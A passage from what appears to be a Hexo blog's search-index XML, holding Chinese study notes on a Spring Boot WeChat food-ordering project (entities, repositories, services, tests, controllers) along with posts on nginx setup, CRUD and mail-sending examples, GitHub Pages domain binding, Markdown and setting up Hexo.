orderMaster.setBuyerOpenid(OPENID); orderMaster.setOrderAmount(new BigDecimal(3.5)); OrderMaster result = repository.save(orderMaster); Assert.assertNotNull(result); &#125; @Test public void findByBuyerOpenid() &#123; //第几页，每页几条数据 PageRequest pageRequest = new PageRequest(0, 3); Page&lt;OrderMaster&gt; result = repository.findByBuyerOpenid(OPENID, pageRequest); Assert.assertNotEquals(0, result);// System.out.println(result.getTotalElements()); &#125;&#125;]]></content>
      <categories>
        <category>springboot微信点餐</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[与前端交互]]></title>
    <url>%2F2018%2F09%2F03%2F%E4%B8%8E%E5%89%8D%E7%AB%AF%E4%BA%A4%E4%BA%92%2F</url>
    <content type="text"><![CDATA[我的环境是deepin系统，虚拟机装了centos7.3 在浏览器输入’虚拟机ip/#/order’添加一cookie值： F12 在Console页面输入document.cookie=’openid=abc123’ (这里的abc123可以是任意值) 在Application下cookies选项中即可看见刚添加的cookie 连接上虚拟机打开主机终端 输入：ssh root@虚拟机ip,再输入密码修改nginx配置: vim /usr/local/nginx/conf/nginx.conf server_name 后面改成sell.comproxy_pass 后面改成主机的ip地址改完重启一下：nginx -s reload 修改本机上的hosts主机终端输入：sudo vim /etc/hosts加上：虚拟机ip sell.com 在浏览器输入sell.com也能打开页面]]></content>
  </entry>
  <entry>
    <title><![CDATA[商品表创建]]></title>
    <url>%2F2018%2F08%2F31%2F%E5%95%86%E5%93%81%E8%A1%A8%E5%88%9B%E5%BB%BA%2F</url>
    <content type="text"><![CDATA[目前项目结构 1.生成ProductInfo.java文件 [dataobject]123456789101112131415161718192021222324252627282930313233343536373839404142434445package com.imooc.sell.dataobject;import lombok.Data;import javax.persistence.Entity;import javax.persistence.Id;import java.math.BigDecimal;/** * @program: sell * @description: 商品 * @author: Junno * @create: 2018-08-30 18:59 **/@Entity@Datapublic class ProductInfo &#123; @Id private String productId; /** 商品名称. */ private String productName; /** 商品价格. */ private BigDecimal productPrice; /** 库存. */ private Integer productStock; /** 描述. */ private String productDescription; /** 小图. */ private String productIcon; /** 商品状态. */ private Integer productStatus; /** 类目编号. */ private Integer categoryType;&#125; 2.生成ProductInfoRepository.java文件 [repository]1234567891011121314151617package com.imooc.sell.repository;import com.imooc.sell.dataobject.ProductInfo;import org.springframework.data.jpa.repository.JpaRepository;import java.util.List;/** * @program: sell * @description: 商品dao * @author: Junno * @create: 2018-08-30 19:01 **/public interface ProductInfoRepository extends JpaRepository&lt;ProductInfo,String&gt; &#123; List&lt;ProductInfo&gt; findByProductStatus(Integer productStatus);&#125; 3.生成ProductInfoRepositoryTest.java文件12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758package com.imooc.sell.repository;import com.imooc.sell.dataobject.ProductCategory;import com.imooc.sell.dataobject.ProductInfo;import org.junit.Assert;import org.junit.Test;import org.junit.runner.RunWith;import org.springframework.beans.factory.annotation.Autowired;import org.springframework.boot.test.context.SpringBootTest;import org.springframework.test.context.junit4.SpringRunner;import java.math.BigDecimal;import java.util.List;import static org.junit.Assert.*;@RunWith(SpringRunner.class)@SpringBootTestpublic class ProductInfoRepositoryTest &#123; @Autowired private ProductInfoRepository repository; @Test public void saveTest()&#123; ProductInfo productInfo = new ProductInfo(); productInfo.setProductId("123456"); productInfo.setProductName("宫保鸡丁"); productInfo.setProductPrice(new BigDecimal(13.2)); productInfo.setProductStock(100); productInfo.setProductDescription("绝世美味"); productInfo.setProductIcon("http://xxxx.jpg"); productInfo.setProductStatus(0); productInfo.setCategoryType(2); ProductInfo result = repository.save(productInfo); Assert.assertNotNull(result); &#125; @Test public void findByProductStatus() &#123; List&lt;ProductInfo&gt; productInfoList = repository.findByProductStatus(0); Assert.assertNotEquals(0, productInfoList.size()); &#125;&#125; 4.生成ProductService.java文件 [service]12345678910111213141516171819202122232425262728293031323334353637383940package com.imooc.sell.service;import com.imooc.sell.dataobject.ProductInfo;import com.imooc.sell.dto.CartDTO;import org.springframework.data.domain.Page;import org.springframework.data.domain.Pageable;import java.util.List;/** * @program: sell * @description: 商品 service接口 * @author: Junno * @create: 2018-08-30 19:25 **/public interface ProductService &#123; ProductInfo findOne(String productId); /** *@Description: 查询所有在架商品列表 *@Author: Junno *@Date: 18-8-30 下午7:28 */ List&lt;ProductInfo&gt; findUpAll(); Page&lt;ProductInfo&gt; findAll(Pageable pageable); ProductInfo save(ProductInfo productInfo); //加库存 void increaseStock(List&lt;CartDTO&gt; cartDTOList); //减库存 void decreaseStock(List&lt;CartDTO&gt; cartDTOList);&#125; 5.生成ProductServiceImpl.java文件 [service.impl]123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384package com.imooc.sell.service.impl;import com.imooc.sell.dataobject.ProductInfo;import com.imooc.sell.dto.CartDTO;import com.imooc.sell.enums.ProductStatusEnum;import com.imooc.sell.enums.ResultEnum;import com.imooc.sell.exception.SellException;import com.imooc.sell.repository.ProductInfoRepository;import com.imooc.sell.service.ProductService;import org.springframework.beans.factory.annotation.Autowired;import org.springframework.data.domain.Pageable;import org.springframework.data.domain.Page;import org.springframework.stereotype.Service;import javax.transaction.Transactional;import java.util.List;/** * @program: sell * @description: 商品 service实现类 * @author: Junno * @create: 2018-08-30 19:34 **/@Servicepublic class ProductServiceImpl implements ProductService &#123; @Autowired private ProductInfoRepository repository; @Override public ProductInfo findOne(String productId) &#123; return repository.findById(productId).orElse(null); &#125; @Override public List&lt;ProductInfo&gt; findUpAll() &#123; return repository.findByProductStatus(ProductStatusEnum.UP.getCode()); &#125; @Override public Page&lt;ProductInfo&gt; findAll(Pageable pageable) &#123; return repository.findAll(pageable); &#125; @Override public ProductInfo save(ProductInfo productInfo)&#123; return repository.save(productInfo); &#125; @Override public void increaseStock(List&lt;CartDTO&gt; cartDTOList) &#123; &#125; //减库存 @Override @Transactional public void decreaseStock(List&lt;CartDTO&gt; cartDTOList) &#123; //遍历 for(CartDTO cartDTO : cartDTOList)&#123; ProductInfo productInfo = repository.findById(cartDTO.getProductId()).orElse(null); //如果没有这个商品,抛异常 if(productInfo == null)&#123; throw new SellException(ResultEnum.PRODUCT_NOT_EXIST); &#125; Integer result = productInfo.getProductStock() - cartDTO.getProductQuantity(); if(result &lt; 0)&#123; throw new SellException(ResultEnum.PRODUCT_STOCK_ERROR); &#125; productInfo.setProductStock(result); repository.save(productInfo); &#125; &#125;&#125; 6.生成ProductServiceImplTest.java文件123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778package com.imooc.sell.service.impl;import com.imooc.sell.dataobject.ProductInfo;import com.imooc.sell.enums.ProductStatusEnum;import org.junit.Assert;import org.junit.Test;import org.junit.runner.RunWith;import org.springframework.beans.factory.annotation.Autowired;import org.springframework.boot.test.context.SpringBootTest;import org.springframework.data.domain.Page;import org.springframework.data.domain.PageRequest;import org.springframework.test.context.junit4.SpringRunner;import java.math.BigDecimal;import java.util.List;import static org.junit.Assert.*;@RunWith(SpringRunner.class)@SpringBootTestpublic class ProductServiceImplTest &#123; @Autowired private ProductServiceImpl productService; @Test public void findOne() &#123; ProductInfo productInfo = productService.findOne("123456"); Assert.assertEquals("123456", productInfo.getProductId()); &#125; @Test public void findUpAll() &#123; List&lt;ProductInfo&gt; productInfoList= productService.findUpAll(); Assert.assertNotEquals(0, productInfoList.size()); &#125; @Test public void findAll() &#123; PageRequest request = new PageRequest(0, 2); Page&lt;ProductInfo&gt; productInfoPage = productService.findAll(request); //System.out.println(productInfoPage.getTotalElements()); Assert.assertNotEquals(0, productInfoPage); &#125; @Test public void save() &#123; ProductInfo productInfo = new ProductInfo(); productInfo.setProductId("123458"); productInfo.setProductName("辣椒炒肉"); productInfo.setProductPrice(new BigDecimal(13.2)); productInfo.setProductStock(100); productInfo.setProductDescription("辣翻天"); productInfo.setProductIcon("http://xxxx.jpg"); productInfo.setProductStatus(ProductStatusEnum.DOWN.getCode()); productInfo.setCategoryType(2); ProductInfo result = productService.save(productInfo); Assert.assertNotNull(result); &#125;&#125; 7.生成ProductStatusEnum.java文件 【enums】123456789101112131415161718192021222324252627282930313233package com.imooc.sell.enums;/**商品状态*/import lombok.Getter;@Getterpublic enum ProductStatusEnum &#123; UP(0,"在架"), DOWN(1,"下架"), ; private Integer code; private String message; ProductStatusEnum(Integer code,String message) &#123; this.code = code; this.message = message; &#125; public Integer getCode() &#123; return code; &#125; public String getMessage() &#123; return message; &#125;&#125; 8.生成ResultVoUtil文件 [json 返回值]12345678910111213141516171819202122232425262728293031package com.imooc.sell.utils;import com.imooc.sell.VO.ResultVO;/** * @program: sell * @description: * @author: Junno * @create: 2018-08-31 16:52 **/public class ResultVoUtil &#123; public static ResultVO success(Object object)&#123; ResultVO resultVO = new ResultVO(); resultVO.setData(object); resultVO.setCode(0); resultVO.setMsg("成功"); return resultVO; &#125; public static ResultVO success()&#123; return success(null); &#125; public static ResultVO error(Integer code,String msg)&#123; ResultVO resultVO = new ResultVO(); resultVO.setCode(1); resultVO.setMsg(msg); return resultVO; &#125;&#125; 9.配置Json格式 ProductInfoVo [json 返回值]12345678910111213141516171819202122232425262728293031323334package com.imooc.sell.VO;import com.fasterxml.jackson.annotation.JsonProperty;import lombok.Data;import java.math.BigDecimal;/** * @program: sell * @description: 商品详情 * @author: Junno * @create: 2018-08-30 22:35 **/@Datapublic class ProductInfoVO &#123; @JsonProperty("id") private String productId; @JsonProperty("name") private String productName; @JsonProperty("price") private BigDecimal productPrice; @JsonProperty("description") private String productDescription; @JsonProperty("icon") private String productIcon;&#125; 10.配置Json格式 ProductVO [json 返回值]1234567891011121314151617181920212223242526272829package com.imooc.sell.VO;import com.fasterxml.jackson.annotation.JsonProperty;import lombok.Data;import java.util.List;/** * @program: sell * @description: 商品包含类目 * @author: Junno * @create: 2018-08-30 22:30 **/@Datapublic class ProductVO &#123; @JsonProperty("name") private String name; @JsonProperty("type") private Integer type; @JsonProperty("foods") private List&lt;ProductInfoVO&gt; productInfoVOList;&#125; 11.配置Json格式 ResultVO [json 返回值]1234567891011121314151617181920212223242526package com.imooc.sell.VO;import lombok.Data;/** * @program: sell * @description: http请求返回的最外层的结构 * @author: Junno * @create: 2018-08-30 21:47 **/@Datapublic class ResultVO&lt;T&gt; &#123; /*错误码*/ private Integer code; /*提示信息*/ private String msg; /*具体内容*/ private T data;&#125; 12.新建BuyerProductController.java [调用拼装 JSON 格式]123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596package com.imooc.sell.controller;import com.imooc.sell.VO.ProductInfoVO;import com.imooc.sell.VO.ProductVO;import com.imooc.sell.VO.ResultVO;import com.imooc.sell.dataobject.ProductCategory;import com.imooc.sell.dataobject.ProductInfo;import com.imooc.sell.service.CategoryService;import com.imooc.sell.service.ProductService;import com.imooc.sell.utils.ResultVoUtil;import org.springframework.beans.BeanUtils;import org.springframework.beans.factory.annotation.Autowired;import org.springframework.web.bind.annotation.GetMapping;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.RestController;import java.util.ArrayList;import java.util.Arrays;import java.util.List;import java.util.stream.Collectors;/** * @program: sell * @description: 买家商品 * @author: Junno * @create: 2018-08-30 21:42 **/@RestController@RequestMapping("/buyer/product")public class BuyerProductController &#123; @Autowired private ProductService productService; @Autowired private CategoryService categoryService; @GetMapping("/list") public ResultVO list()&#123; //查询所有上架的商品 List&lt;ProductInfo&gt; productInfoList = productService.findUpAll(); //查询类目（一次性查询）// List&lt;Integer&gt; categoryTypeList = new ArrayList&lt;&gt;(); //传统方法// for(ProductInfo productInfo: productInfoList)&#123;// categoryTypeList.add(productInfo.getCategoryType())// &#125; //精简方法(java8, lambda)重点 List&lt;Integer&gt; categoryTypeList = productInfoList.stream() .map(e -&gt; e.getCategoryType()) .collect(Collectors.toList()); List&lt;ProductCategory&gt; productCategoryList =categoryService.findByCategoryTypeIn(categoryTypeList); //数据拼装 List&lt;ProductVO&gt; productVOList = new ArrayList&lt;&gt;(); for(ProductCategory productCategory : productCategoryList)&#123; ProductVO productVO = new ProductVO(); productVO.setType(productCategory.getCategoryType()); productVO.setName(productCategory.getCategoryName()); List&lt;ProductInfoVO&gt; productInfoVOList = new ArrayList&lt;&gt;(); for(ProductInfo productInfo : productInfoList)&#123; if(productInfo.getCategoryType().equals(productCategory.getCategoryType()))&#123; ProductInfoVO productInfoVO = new ProductInfoVO(); /**拷贝 productInfo 相同字段. */ BeanUtils.copyProperties(productInfo,productInfoVO); productInfoVOList.add(productInfoVO); &#125; &#125; productVO.setProductInfoVOList(productInfoVOList); productVOList.add(productVO); &#125; return ResultVoUtil.success(productVOList); &#125;&#125;]]></content>
      <categories>
        <category>springboot微信点餐</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Springboot 微信点餐类目表创建]]></title>
    <url>%2F2018%2F08%2F30%2F%E7%B1%BB%E7%9B%AE%E8%A1%A8%E5%88%9B%E5%BB%BA%2F</url>
    <content type="text"><![CDATA[慕课网 Spring Boot企业微信点餐系统, 廖师兄, 学习笔记 1.配置pom.xml文件12345678910111213141516171819&lt;!--配置Mysql 属性 --&gt;&lt;dependency&gt; &lt;groupId&gt;mysql&lt;/groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt;&lt;/dependency&gt; &lt;!--配置hibernate JPA属性 --&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-data-jpa&lt;/artifactId&gt;&lt;/dependency&gt;&lt;!--配置LomBok 属性--&gt;&lt;dependency&gt; &lt;groupId&gt;org.projectlombok&lt;/groupId&gt; &lt;artifactId&gt;lombok&lt;/artifactId&gt;&lt;/dependency&gt; 2.配置application.yml文件1234567891011spring: datasource: driver-class-name: com.mysql.jdbc.Driver username: root password: 123456 url: jdbc:mysql://127.0.0.1/sell?characterEncoding=utf-8&amp;useSSL=false jpa: show-sql: trueserver: servlet: context-path: /sell 3.配置ProductCategory.java 文件 [dataobject]123456789101112131415161718192021222324252627282930313233343536373839404142package com.imooc.sell.dataobject;import lombok.Data;import org.hibernate.annotations.DynamicUpdate;import javax.persistence.Entity;import javax.persistence.GeneratedValue;import javax.persistence.GenerationType;import javax.persistence.Id;/** * @program: sell * @description: 类目 * @author: Junno * @create: 2018-08-30 14:39 **//**实体类*/@Entity/** 修改时间属性. */@DynamicUpdate/**getter、setter和toString方法注解*/@Datapublic class ProductCategory &#123; @Id @GeneratedValue(strategy = GenerationType.IDENTITY) /**类目id. */ private Integer categoryId; /**类目名称. */ private String categoryName; /**类目属性. */ private Integer categoryType; public ProductCategory() &#123; &#125; public ProductCategory(String categoryName, Integer categoryType) &#123; this.categoryName = categoryName; this.categoryType = categoryType; &#125;&#125; 4.配置ProductCategoryRepository.java 文件 [repository]12345678910111213141516package com.imooc.sell.repository;import com.imooc.sell.dataobject.ProductCategory;import org.springframework.data.jpa.repository.JpaRepository;import java.util.List;/** * @program: sell * @description: * @author: Junno * @create: 2018-08-30 14:44 **/public interface ProductCategoryRepository extends JpaRepository&lt;ProductCategory,Integer&gt; &#123; List&lt;ProductCategory&gt; findByCategoryTypeIn(List&lt;Integer&gt; categroyTypeList);&#125; 5.生成ProductCategoryRepositoryTest.java 测试类1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950package com.imooc.sell.repository;import com.imooc.sell.dataobject.ProductCategory;import org.junit.Assert;import org.junit.Test;import org.junit.runner.RunWith;import org.springframework.beans.factory.annotation.Autowired;import org.springframework.boot.test.context.SpringBootTest;import org.springframework.test.context.junit4.SpringRunner;import javax.transaction.Transactional;import java.util.Arrays;import java.util.List;import static org.junit.Assert.*;@RunWith(SpringRunner.class)@SpringBootTestpublic class ProductCategoryRepositoryTest &#123; @Autowired private ProductCategoryRepository repository; @Test public void findOneTest()&#123; ProductCategory category = repository.findById(1).orElse(null); System.out.println(category.toString()); &#125; @Test @Transactional//不改变数据库的数据 public void saveTest()&#123; ProductCategory productCategory= new ProductCategory(&quot;男生最爱&quot;,4); ProductCategory result = repository.save(productCategory); Assert.assertNotNull(result);//不期望是null，实际是result// Assert.assertNotEquals(null, result); &#125; @Test public void findByCategoryTypeInTest()&#123; List&lt;Integer&gt; list = Arrays.asList(1,4,5); List&lt;ProductCategory&gt; result = repository.findByCategoryTypeIn(list); Assert.assertNotEquals(0,result.size()); &#125;&#125; 6.生成CategoryService 文件 [service]12345678910111213141516171819202122232425package com.imooc.sell.service;import com.imooc.sell.dataobject.ProductCategory;import java.util.List;/** * @program: sell * @description: 类目 接口 * @author: Junno * @create: 2018-08-30 16:17 **/public interface CategoryService &#123; ProductCategory findById(Integer categoryId); List&lt;ProductCategory &gt; findAll(); List&lt;ProductCategory&gt; findByCategoryTypeIn(List&lt;Integer&gt; categoryTypeList); ProductCategory save(ProductCategory productCategory);&#125; 7.生成CategoryServiceImpl 文件 [service.impl]12345678910111213141516171819202122232425262728293031323334353637383940414243package com.imooc.sell.service.impl;import com.imooc.sell.dataobject.ProductCategory;import com.imooc.sell.repository.ProductCategoryRepository;import com.imooc.sell.service.CategoryService;import org.springframework.beans.factory.annotation.Autowired;import org.springframework.stereotype.Service;import java.util.List;/** * @program: sell * @description: 类目 Service实现 * @author: Junno * @create: 2018-08-30 16:24 **/@Servicepublic class CategoryServiceImpl implements CategoryService &#123; @Autowired private ProductCategoryRepository repository; @Override public ProductCategory findById(Integer categoryId) &#123; return repository.findById(categoryId).orElse(null); &#125; @Override public List&lt;ProductCategory&gt; findAll() &#123; return repository.findAll(); &#125; @Override public List&lt;ProductCategory&gt; findByCategoryTypeIn(List&lt;Integer&gt; categoryTypeList) &#123; return repository.findByCategoryTypeIn(categoryTypeList); &#125; @Override public ProductCategory save(ProductCategory productCategory) &#123; return repository.save(productCategory); &#125;&#125; 8.生成CategoryServiceImplTest 文件123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354package com.imooc.sell.service.impl;import com.imooc.sell.dataobject.ProductCategory;import org.junit.Assert;import org.junit.Test;import org.junit.runner.RunWith;import org.springframework.beans.factory.annotation.Autowired;import org.springframework.boot.test.context.SpringBootTest;import org.springframework.test.context.junit4.SpringRunner;import java.util.Arrays;import java.util.List;import static org.junit.Assert.*;@RunWith(SpringRunner.class)@SpringBootTestpublic class CategoryServiceImplTest &#123; @Autowired private CategoryServiceImpl categoryService; @Test public void findById() &#123; ProductCategory category = categoryService.findById(1); System.out.println(category.toString()); &#125; @Test public void findAll() &#123; List&lt;ProductCategory&gt; productCategoryList= categoryService.findAll(); Assert.assertNotEquals(0, productCategoryList.size()); &#125; @Test public void findByCategoryTypeIn() &#123; List&lt;ProductCategory&gt; productCategoryList = categoryService.findByCategoryTypeIn(Arrays.asList(1, 2, 3, 4, 11)); Assert.assertNotEquals(0, productCategoryList.size()); &#125; @Test public void save() &#123; ProductCategory productCategory = new ProductCategory(&quot;男生专享&quot;, 10); ProductCategory result = categoryService.save(productCategory); Assert.assertNotNull(result); &#125;&#125;]]></content>
      <categories>
        <category>springboot微信点餐</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[SpringBoot增删改查实例]]></title>
    <url>%2F2018%2F08%2F20%2F%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5%2F</url>
    <content type="text"><![CDATA[SpringBoot增删改查实例完整的项目结构 1、修改pom.xml,添加JPA和MySQL的依赖123456789&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-data-jpa&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;mysql&lt;/groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt;&lt;/dependency&gt; 2、修改application.yml,配置JPA和数据库12345678910111213spring: profiles: active: dev datasource: url: jdbc:mysql://127.0.0.1:3306/dbcurd?useUnicode=true&amp;characterEncoding=utf-8&amp;useSSL=false username: root password: 123456 driver-class-name: com.mysql.jdbc.Driver jpa: hibernate: ddl-auto: update show-sql: true 3、创建与数据表对应的实体类Person123456789101112131415161718192021222324252627282930313233343536373839@Entitypublic class Person &#123; @Id //主键id @GeneratedValue //自增长 private int id; private String name; private int age; //必须要有构造函数 public Person() &#123; &#125; public int getId() &#123; return id; &#125; public void setId(int id) &#123; this.id = id; &#125; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125; public int getAge() &#123; return age; &#125; public void setAge(int age) &#123; this.age = age; &#125;&#125; 运行项目后，查看数据库，会自动创建表 person ,(使用了navicat图形化工具查看) 3、创建接口 PersonRepository.javaPersonRepository.java位于dao包下,PersonController调用该接口继承自JpaRepository的方法，来实现和数据库交互 123public interface PersonRepository extends JpaRepository&lt;Person,Integer&gt; &#123; &#125; 4、创建控制器PersonController.java123456789101112131415161718@RestControllerpublic class PersonController &#123; @Autowired PersonRepository personRepository; /** *@Author:Junno *@Description: 查询所有数据 *@Date: 17:00 2018/8/20 */ @GetMapping(&quot;/persons&quot;) public List&lt;Person&gt; personList()&#123; return personRepository.findAll(); &#125;&#125; 首先在在数据库中手动添加两条数据 启动项目执行请求 localhost:8081/persons 5、其他增删改查的方法1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556/** *@Author:Junno *@Description : 添加一条信息 *@Date: 17:13 2018/8/20*/@PostMapping(value = "/person")public Person addPerson(@RequestParam("name") String name, @RequestParam("age") Integer age)&#123; Person person = new Person(); person.setName(name); person.setAge(age); return personRepository.save(person);&#125;/** *@Author:Junno *@Description: 更新一条信息 *@Date: 17:26 2018/8/20*/@PutMapping(value = "/person/&#123;id&#125;")public Person updatePerson(@PathVariable("id") Integer id, @RequestParam("name") String name, @RequestParam("age") Integer age)&#123; Person person = new Person(); person.setId(id); person.setName(name); person.setAge(age); return personRepository.save(person);&#125;/** *@Author:Junno *@Description: 根据id查询 *@Date: 17:38 2018/8/20*/@GetMapping(value = "/person/&#123;id&#125;")public Person findOnePerson(@PathVariable("id") Integer id)&#123; return personRepository.findById(id).orElse(null);&#125;/** *@Author:Junno *@Description: 删除 *@Date: 17:40 2018/8/20*/@DeleteMapping(value = "/person/&#123;id&#125;")public void deletePerson(@PathVariable("id") Integer id)&#123; personRepository.deleteById(id);&#125; 对应的请求方式为： 添加一个用户 (用的是Postman) 更新一个用户 查询一个用户： 删除一个用户（无返回值)]]></content>
  </entry>
  <entry>
    <title><![CDATA[springboot实现发送邮件功能]]></title>
    <url>%2F2018%2F08%2F20%2Fspringboot%E5%AE%9E%E7%8E%B0%E5%8F%91%E9%80%81%E9%82%AE%E4%BB%B6%E5%8A%9F%E8%83%BD%2F</url>
    <content type="text"><![CDATA[近期学了springboot，记录springboot实现发送邮件功能，编译器用IDEA 1、配置邮件服务器本文使用网易163邮箱测试，在以下界面中开启smtp服务器，设置授权码，在后面代码中会使用到,发送方和接受方都需要这样设置。 2、实现邮件客户端1）修改pom.xml，添加依赖库1234&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-mail&lt;/artifactId&gt;&lt;/dependency&gt; 2）修改application.yml，添加邮箱配置12345678910111213141516171819#JavaMailSender邮件发送的配置spring: mail: host: smtp.163.com username: xxxxx@163.com password: xxxx #授权码登录 from: xxxx@163.com #发送方账号信息 properties: mail: smtp: auth: true timeout: 25000 starttls: enable: true required: truesendmails: touser: xxxx@163.com #发送给谁title: name: firstEmail #标题文件 3）新增MailController123456789101112131415161718192021222324252627282930313233343536373839@RestControllerpublic class MailController &#123; private final static Logger logger = LoggerFactory.getLogger(MailController.class); @Autowired private JavaMailSender sender; //发送方 @Value("$&#123;spring.mail.from&#125;") private String from; //接收方 @Value("$&#123;sendmails.touser&#125;") private String[] touser; //标题 @Value("$&#123;title.name&#125;") private String title; @GetMapping("/sends") public String sendmail() &#123; MimeMessage message = null; try &#123; message = sender.createMimeMessage(); MimeMessageHelper helper = new MimeMessageHelper(message, true, "utf-8");//项目字符集 要设置成 utf-8 否则会有乱码问题 helper.setFrom(from); helper.setTo(touser); helper.setSubject("标题：" + title); helper.setText("发送的内容", true); &#125; catch (MessagingException e) &#123; logger.debug("系统发送邮件 异常"); e.printStackTrace(); &#125; sender.send(message); return "系统发送邮件成功。。。"; &#125;&#125; 4）运行测试浏览器中输入： http://localhost:8080/sends 查看邮箱可以收到刚发送的邮件]]></content>
  </entry>
  <entry>
    <title><![CDATA[springboot实现发送邮件功能]]></title>
    <url>%2F2018%2F08%2F20%2Femail%2F</url>
    <content type="text"><![CDATA[近期学了springboot，记录springboot实现发送邮件功能，编译器用IDEA 1、配置邮件服务器本文使用网易163邮箱测试，在以下界面中开启smtp服务器，设置授权码，在后面代码中会使用到,发送方和接受方都需要这样设置。 2、实现邮件客户端1）修改pom.xml，添加依赖库1234&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-mail&lt;/artifactId&gt;&lt;/dependency&gt; 2）修改application.yml，添加邮箱配置12345678910111213141516171819#JavaMailSender邮件发送的配置spring: mail: host: smtp.163.com username: xxxxx@163.com password: xxxx #授权码登录 from: xxxx@163.com #发送方账号信息 properties: mail: smtp: auth: true timeout: 25000 starttls: enable: true required: truesendmails: touser: xxxx@163.com #发送给谁title: name: firstEmail #标题文件 3）新增MailController123456789101112131415161718192021222324252627282930313233343536373839@RestControllerpublic class MailController &#123; private final static Logger logger = LoggerFactory.getLogger(MailController.class); @Autowired private JavaMailSender sender; //发送方 @Value("$&#123;spring.mail.from&#125;") private String from; //接收方 @Value("$&#123;sendmails.touser&#125;") private String[] touser; //标题 @Value("$&#123;title.name&#125;") private String title; @GetMapping("/sends") public String sendmail() &#123; MimeMessage message = null; try &#123; message = sender.createMimeMessage(); MimeMessageHelper helper = new MimeMessageHelper(message, true, "utf-8");//项目字符集 要设置成 utf-8 否则会有乱码问题 helper.setFrom(from); helper.setTo(touser); helper.setSubject("标题：" + title); helper.setText("发送的内容", true); &#125; catch (MessagingException e) &#123; logger.debug("系统发送邮件 异常"); e.printStackTrace(); &#125; sender.send(message); return "系统发送邮件成功。。。"; &#125;&#125; 4）运行测试浏览器中输入： http://localhost:8080/sends 查看邮箱可以收到刚发送的邮件]]></content>
  </entry>
  <entry>
    <title><![CDATA[text]]></title>
    <url>%2F2018%2F07%2F07%2Ftext%2F</url>
    <content type="text"></content>
  </entry>
  <entry>
    <title><![CDATA[域名绑定]]></title>
    <url>%2F2018%2F05%2F22%2F%E5%9F%9F%E5%90%8D%E7%BB%91%E5%AE%9A%2F</url>
    <content type="text"><![CDATA[域名绑定在这之前你已经搭建好了博客，已经可以通过类似：https://junnochen.github.io/的方法访问。 没有域名的话先去申请一个域名添加域名解析ping你的http://github.io域名，得到一个IP；修改域名解析记录； 在仓库里添加CNAME文件并在文件中填写绑定的域名文件里填写要绑定的域名且不要包含Http://和www进入设置，找到 Custom domain添加域名后保存]]></content>
  </entry>
  <entry>
    <title><![CDATA[MarkDown语法]]></title>
    <url>%2F2018%2F05%2F09%2FMarkDown%E8%AF%AD%E6%B3%95%2F</url>
    <content type="text"><![CDATA[Markdown 表示超链接 ##大标题 ###小标题blah blah blah 空格 中文全角空格表示文章标题 内容 区块引用1 23列表 内容* 表示强调内容 图片]]></content>
  </entry>
  <entry>
    <title><![CDATA[利用开源框架搭建自己的博客]]></title>
    <url>%2F2018%2F05%2F08%2F%E5%88%A9%E7%94%A8%E5%BC%80%E6%BA%90%E6%A1%86%E6%9E%B6%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E5%8D%9A%E5%AE%A2%2F</url>
    <content type="text"><![CDATA[为什么要创建一个自己的博客？基于我自己的理解来说，对于一个技术人员，在技术成长的道路中，你肯定会遇到各种各样的问题，为了保证下次遇到同样的问题不会重复浪费时间，就可以把把这些问题记录了下来，防止再次碰到同样的问题还是一头雾水，这样太过浪费时间了。同时你的分享也许会对别人产生帮助。而对于一个非技术人员来说，我保证你在自己的博客发文章跟写说说或者朋友圈有不一样的体验，也就是给地主种地和自己分得了一块地的区别。如果你有兴趣试一下的话，那就跟着下面慢慢来。。。 1.首先你会问我不懂代码怎么办？没关系的，有好多的优秀开源框架可以供我们来使用。什么是开源？简单的说是那些大佬们做好的一些东西，并且直接把源代码放了出来，我们可以去免费使用。至于框架？比如你要盖一个房子，但是你不会，你就可以把框架找来，他已经具备一个房子的模型了但是还可以随意更改，你要做的就是告诉他我要几层的，然后墙壁要什么颜色，地板要什么样的，当你设置完所有的属性后，一个属于你自己的房子就好了，至于他是怎么去铺地板和刷墙的，我们就不需要知道了。在这里我选取的框架是Hexo，因为刚了解了NODEJS，比较熟悉NPM，至于这是神码我们后面会遇到。 2.不知道大家有没有接触过LINUX。现在我们基于WINDOWS来开始。首先你需要Nodejs，因为这个框架是需要这个东西的，至于他是什么自己去了解。而他的安装也是很简单的。直接搜一下，然后上去他的官网，英文网站也不用怕，因为你只需要找Download。然后找到适合自己电脑的版本。安装过程和大多数软件一样，一路next就行了。安装好以后可以在自己的命令行里面试一下（node -v）如果返回软件版本号就好了。 3.下面我们需要用到Git，当然我们只是使用它一些比较简单的功能。下载安装和普通的软件也一样。安装好以后点一下鼠标右键你会发现多了两个选项（git bash here git GUI here）第一个是用命令行的方式使用，第二个是使用图形界面。在哪个界面下点右键就是在那个路径下使用git，推荐使用命令行方式，简单方便。 4.上面都好了以后我们就可以开始使用HEXO了，首先找一个合适的位置存放你的文件，你可以选择任意一个盘下面。然后用鼠标右键打开git的命令行界面，然后我们可以使用npm来安装Hexo。在整个项目中我们安装东西都使用npm，我们输入（npm install -g 